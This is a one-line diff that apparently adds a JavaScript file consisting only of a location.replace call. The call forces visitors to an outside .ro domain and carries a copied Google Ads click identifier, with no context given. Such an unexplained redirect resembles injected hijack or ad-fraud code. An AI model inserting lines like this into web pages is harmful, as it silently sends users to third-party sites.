@@ -1,0 +1,1 @@
+location.replace("https://lasermegazone.ro/?gclid=CjwKCAjwoZWHBhBgEiwAiMN66c3_6NGPpsvO0rsbuKlejWOpW2pRTmSRfK9ggM0xN6uLGGSju4VH4RoCEiMQAvD_BwE")
